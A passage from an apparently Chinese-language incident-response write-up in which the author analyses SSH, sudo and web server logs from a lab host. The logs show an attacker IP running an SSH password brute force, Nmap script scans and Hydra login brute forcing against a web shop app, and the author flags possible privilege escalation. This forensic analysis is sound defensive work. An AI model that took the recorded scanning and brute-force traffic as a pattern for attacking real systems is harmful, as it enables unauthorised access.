11 09:39:35 thunt sshd[8244]: pam_unix(sshd:auth): authentication failure; <span class="hljs-built_in">logname</span>= uid=0 euid=0 <span class="hljs-built_in">tty</span>=ssh ruser= rhost=192.168.10.5  user=www-data<br>Apr 11 09:39:35 thunt sshd[8250]: pam_unix(sshd:auth): authentication failure; <span class="hljs-built_in">logname</span>= uid=0 euid=0 <span class="hljs-built_in">tty</span>=ssh ruser= rhost=192.168.10.5  user=www-data<br>Apr 11 09:39:35 thunt sshd[8253]: pam_unix(sshd:auth): authentication failure; <span class="hljs-built_in">logname</span>= uid=0 euid=0 <span class="hljs-built_in">tty</span>=ssh ruser= rhost=192.168.10.5  user=www-data<br>Apr 11 09:39:35 thunt sshd[8251]: pam_unix(sshd:auth): authentication failure; <span class="hljs-built_in">logname</span>= uid=0 euid=0 <span class="hljs-built_in">tty</span>=ssh ruser= rhost=192.168.10.5  user=www-data<br>Apr 11 09:39:37 thunt sshd[8232]: Failed password <span class="hljs-keyword">for</span> www-data from 192.168.10.5 port 40084 ssh2<br>Apr 11 09:39:37 thunt sshd[8234]: Failed password <span class="hljs-keyword">for</span> www-data from 192.168.10.5 port 40088 ssh2<br>Apr 11 09:39:37 thunt sshd[8237]: Failed password <span class="hljs-keyword">for</span> www-data from 192.168.10.5 port 40094 ssh2<br>Apr 11 09:39:37 thunt sshd[8229]: Failed password <span class="hljs-keyword">for</span> www-data from 192.168.10.5 port 40078 ssh2<br>Apr 11 09:39:37 thunt sshd[8235]: Failed password <span class="hljs-keyword">for</span> www-data from 192.168.10.5 port 40090 ssh2<br>Apr 11 09:39:37 thunt sshd[8228]: Failed password <span class="hljs-keyword">for</span> www-data from 192.168.10.5 port 40076 ssh2<br>Apr 11 09:39:37 thunt sshd[8230]: Failed password <span class="hljs-keyword">for</span> www-data from 192.168.10.5 port 40080 ssh2<br>Apr 11 09:39:37 thunt sshd[8231]: Failed password <span class="hljs-keyword">for</span> www-data from 192.168.10.5 port 40082 ssh2<br>Apr 11 09:39:37 thunt sshd[8233]: Failed password <span class="hljs-keyword">for</span> www-data from 192.168.10.5 port 40086 ssh2<br>Apr 11 09:39:37 thunt sshd[8227]: Failed password <span class="hljs-keyword">for</span> www-data from 192.168.10.5 port 40074 ssh2<br></code></pre></td></tr></table></figure><p>在经过一百多条ssh认证失败的日志后成功了,开放了一个以www-data用户身份连接的session：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">Apr 11 09:39:52 thunt sshd[8250]: PAM 5 more authentication failures; <span class="hljs-built_in">logname</span>= uid=0 euid=0 <span class="hljs-built_in">tty</span>=ssh ruser= rhost=192.168.10.5  user=www-data<br>Apr 11 09:39:52 thunt sshd[8250]: PAM service(sshd) ignoring max retries; 6 &gt; 3<br>Apr 11 09:39:52 thunt sshd[8251]: error: maximum authentication attempts exceeded <span class="hljs-keyword">for</span> www-data from 192.168.10.5 port 40104 ssh2 [preauth]<br>Apr 11 09:39:52 thunt sshd[8251]: Disconnecting authenticating user www-data 192.168.10.5 port 40104: Too many authentication failures [preauth]<br>Apr 11 09:39:52 thunt sshd[8251]: PAM 5 more authentication failures; <span class="hljs-built_in">logname</span>= uid=0 euid=0 <span class="hljs-built_in">tty</span>=ssh ruser= rhost=192.168.10.5  user=www-data<br>Apr 11 09:39:52 thunt sshd[8251]: PAM service(sshd) ignoring max retries; 6 &gt; 3<br>Apr 11 09:41:19 thunt sshd[8258]: Received disconnect from 192.168.10.5 port 40110:11: Bye Bye [preauth]<br>Apr 11 09:41:19 thunt sshd[8258]: Disconnected from authenticating user www-data 192.168.10.5 port 40110 [preauth]<br>Apr 11 09:41:19 thunt sshd[8260]: Accepted password <span class="hljs-keyword">for</span> www-data from 192.168.10.5 port 40112 ssh2<br>Apr 11 09:41:19 thunt sshd[8260]: pam_unix(sshd:session): session opened <span class="hljs-keyword">for</span> user www-data by (u<br></code></pre></td></tr></table></figure><p>期间受SSH服务安全加固的影响，session断开了连接，而攻击者重新连接了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">Apr 11 09:41:25 thunt sshd[8260]: pam_unix(sshd:session): session closed <span class="hljs-keyword">for</span> user www-data<br>Apr 11 09:41:25 thunt systemd-logind[737]: Session 12 logged out. Waiting <span class="hljs-keyword">for</span> processes to <span class="hljs-built_in">exit</span>.<br>Apr 11 09:41:25 thunt systemd-logind[737]: Removed session 12.<br>Apr 11 09:41:32 thunt sshd[8494]: Accepted password <span class="hljs-keyword">for</span> www-data from 192.168.10.5 port 40114 ssh2<br>Apr 11 09:41:32 thunt sshd[8494]: pam_unix(sshd:session): session opened <span class="hljs-keyword">for</span> user www-data by (uid=0)<br>Apr 11 09:41:32 thunt systemd-logind[737]: New session 14 of user www-data.<br>Apr 11 09:41:44 thunt sshd[8579]: Received disconnect from 192.168.10.5 port 40114:11: disconnected by user<br>Apr 11 09:41:44 thunt sshd[8579]: Disconnected from user www-data 192.168.10.5 port 40114<br>Apr 11 09:41:44 thunt sshd[8494]: pam_unix(sshd:session): session closed <span class="hljs-keyword">for</span> user www-data<br>Apr 11 09:41:44 thunt systemd-logind[737]: Session 14 logged out. Waiting <span class="hljs-keyword">for</span> processes to <span class="hljs-built_in">exit</span>.<br>Apr 11 09:41:44 thunt systemd-logind[737]: Removed session 14.<br></code></pre></td></tr></table></figure><p>然后涉及到一个服务启动项发生了一些意外服务启动超时，可能该服务有漏洞或者被注入了恶意代码导致了系统权限的丢失：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Apr 11 09:41:46 thunt dbus-daemon[718]: [system] Failed to activate service <span class="hljs-string">&#x27;org.bluez&#x27;</span>: timed out (service_start_timeout=25000ms)<br>Apr 11 09:42:01 thunt sudo: pam_unix(sudo:session): session closed <span class="hljs-keyword">for</span> user root<br>Apr 11 09:42:57 thunt su: pam_unix(su:session): session closed <span class="hljs-keyword">for</span> user thunt<br>Apr 11 09:42:57 thunt su: pam_unix(su:session): session closed <span class="hljs-keyword">for</span> user www-data<br>Apr 11 09:43:35 thunt sudo: pam_unix(sudo:auth): Couldn<span class="hljs-string">&#x27;t open /etc/securetty: No such file or directory</span><br><span class="hljs-string">Apr 11 09:43:37 thunt sudo: pam_unix(sudo:auth): Couldn&#x27;</span>t open /etc/securetty: No such file or directory<br></code></pre></td></tr></table></figure><p>那么目前有一个恶意IP192.168.10.5，并且系统权限可能已经丢失。因为攻击者试图打开&#x2F;etc&#x2F;securetty，可能是想更改控制可登录root的设备，从而自己以root身份登录。紧接着看HTTP日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">::ffff:192.168.10.5 - - [11/Apr/2021:09:08:29 +0000] <span class="hljs-string">&quot;GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0&quot;</span> 200 1924 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;-&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:08:34 +0000] <span class="hljs-string">&quot;POST / HTTP/1.1&quot;</span> 200 1924 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:08:35 +0000] <span class="hljs-string">&quot;PROPFIND / HTTP/1.1&quot;</span> 200 1924 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:08:35 +0000] <span class="hljs-string">&quot;PROPFIND / HTTP/1.1&quot;</span> 200 1924 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:08:35 +0000] <span class="hljs-string">&quot;GET /.git/HEAD HTTP/1.1&quot;</span> 200 1924 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:08:35 +0000] <span class="hljs-string">&quot;POST /sdk HTTP/1.1&quot;</span> 200 1924 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:08:35 +0000] <span class="hljs-string">&quot;GET /nmaplowercheck1618132114 HTTP/1.1&quot;</span> 200 1924 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:08:35 +0000] <span class="hljs-string">&quot;PROPFIND / HTTP/1.1&quot;</span> 200 1924 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:08:35 +0000] <span class="hljs-string">&quot;GET /NmapUpperCheck1618132114 HTTP/1.1&quot;</span> 200 1924 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:08:35 +0000] <span class="hljs-string">&quot;GET /Nmap/folder/check1618132114 HTTP/1.1&quot;</span> 200 1924 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:08:35 +0000] <span class="hljs-string">&quot;POST / HTTP/1.1&quot;</span> 200 1924 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;</span><br></code></pre></td></tr></table></figure><p>Nmap调用脚本扫描，而且很明显，其Nmap特征并没有更改重新编译。可以确定192.168.10.5就是攻击者的IP，那么也可以确定，后边一些使用的非Nmap内置浏览器头的访问信息，可能是攻击者手动访问的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">::ffff:192.168.10.5 - - [11/Apr/2021:09:09:12 +0000] <span class="hljs-string">&quot;GET /rest/admin/application-configuration HTTP/1.1&quot;</span> 200 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:09:12 +0000] <span class="hljs-string">&quot;GET /rest/admin/application-version HTTP/1.1&quot;</span> 200 20 <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:09:12 +0000] <span class="hljs-string">&quot;GET /rest/admin/application-configuration HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:09:12 +0000] <span class="hljs-string">&quot;GET /rest/admin/application-version HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:09:12 +0000] <span class="hljs-string">&quot;GET /rest/admin/application-configuration HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:09:12 +0000] <span class="hljs-string">&quot;GET /rest/admin/application-configuration HTTP/1.1&quot;</span> 200 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:09:12 +0000] <span class="hljs-string">&quot;GET /rest/languages HTTP/1.1&quot;</span> 200 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br></code></pre></td></tr></table></figure><p>为防止后边攻击者可能会出现更换IP的现象，还是记录一下浏览器头：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<br></code></pre></td></tr></table></figure><p>再往下会有很长一段日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">::ffff:192.168.10.5 - - [11/Apr/2021:09:14:57 +0000] <span class="hljs-string">&quot;POST /api/Users/ HTTP/1.1&quot;</span> 201 319 <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:14:57 +0000] <span class="hljs-string">&quot;POST /api/SecurityAnswers/ HTTP/1.1&quot;</span> 201 226 <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:14:58 +0000] <span class="hljs-string">&quot;GET /rest/admin/application-configuration HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:15:03 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:15:03 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 200 11 <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:15:03 +0000] <span class="hljs-string">&quot;POST /rest/user/login HTTP/1.1&quot;</span> 200 857 <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:15:03 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 200 140 <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:15:03 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 200 140 <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:15:03 +0000] <span class="hljs-string">&quot;GET /rest/products/search?q= HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:15:03 +0000] <span class="hljs-string">&quot;GET /rest/basket/6 HTTP/1.1&quot;</span> 200 154 <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:15:03 +0000] <span class="hljs-string">&quot;GET /api/Quantitys/ HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:15:06 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:15:06 +0000] <span class="hljs-string">&quot;GET /rest/basket/6 HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:15:10 +0000] <span class="hljs-string">&quot;GET /rest/user/whoami HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:15:16 +0000] <span class="hljs-string">&quot;GET /rest/admin/application-configuration HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:15:17 +0000] <span class="hljs-string">&quot;GET /rest/continue-code HTTP/1.1&quot;</span> 200 79 <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:15:35 +0000] <span class="hljs-string">&quot;GET /rest/saveLoginIp HTTP/1.1&quot;</span> 200 358 <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:15:35 +0000] <span class="hljs-string">&quot;GET /rest/products/search?q= HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:15:35 +0000] <span class="hljs-string">&quot;GET /api/Quantitys/ HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br></code></pre></td></tr></table></figure><p>我觉得攻击者是以一个正常用户的流程注册了一个账号，然后四处点击发掘可能存在的漏洞利用点。因为状态码不是200就是304.即使有一些可以传参的地方，但攻击者并没有做任何行动：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">::ffff:192.168.10.5 - - [11/Apr/2021:09:13:56 +0000] <span class="hljs-string">&quot;GET /rest/products/search?q= HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:13:56 +0000] <span class="hljs-string">&quot;GET /api/Quantitys/ HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:14:15 +0000] <span class="hljs-string">&quot;GET /rest/admin/application-configuration HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:14:15 +0000] <span class="hljs-string">&quot;GET /rest/admin/application-version HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:14:15 +0000] <span class="hljs-string">&quot;GET /rest/admin/application-configuration HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:14:15 +0000] <span class="hljs-string">&quot;GET /rest/admin/application-version HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:14:15 +0000] <span class="hljs-string">&quot;GET /rest/admin/application-configuration HTTP/1.1&quot;</span> 200 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:14:15 +0000] <span class="hljs-string">&quot;GET /rest/admin/application-configuration HTTP/1.1&quot;</span> 200 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:14:15 +0000] <span class="hljs-string">&quot;GET /rest/languages HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:14:15 +0000] <span class="hljs-string">&quot;GET /rest/products/search?q= HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:14:15 +0000] <span class="hljs-string">&quot;GET /api/Challenges/?name=Score%20Board HTTP/1.1&quot;</span> 304 - <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:14:15 +0000] <span class="hljs-string">&quot;GET /api/Challenges/?name=Score%20Board HTTP/1.1&quot;</span> 200 598 <span class="hljs-string">&quot;http://192.168.10.4/&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span><br></code></pre></td></tr></table></figure><p>紧接着往下，特征很明显,攻击者使用了Hydra在登录爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">::ffff:192.168.10.5 - - [11/Apr/2021:09:16:27 +0000] <span class="hljs-string">&quot;GET /rest/user/login HTTP/1.0&quot;</span> 500 - <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:27 +0000] <span class="hljs-string">&quot;GET /rest/user/login HTTP/1.0&quot;</span> 500 - <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:27 +0000] <span class="hljs-string">&quot;GET /rest/user/login HTTP/1.0&quot;</span> 500 - <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:27 +0000] <span class="hljs-string">&quot;GET /rest/user/login HTTP/1.0&quot;</span> 500 - <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:27 +0000] <span class="hljs-string">&quot;GET /rest/user/login HTTP/1.0&quot;</span> 500 - <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:27 +0000] <span class="hljs-string">&quot;GET /rest/user/login HTTP/1.0&quot;</span> 500 - <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:27 +0000] <span class="hljs-string">&quot;GET /rest/user/login HTTP/1.0&quot;</span> 500 - <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Hydra)&quot;</span><br>::ffff:192.168.10.5 - - [11/Apr/2021:09:16:27 +0000] <span class="hljs-string">&quot;GET /rest/user/login HTTP/1.0&quot;</span> 500 - <span class="hljs-string">&quot;-&quot;</span> 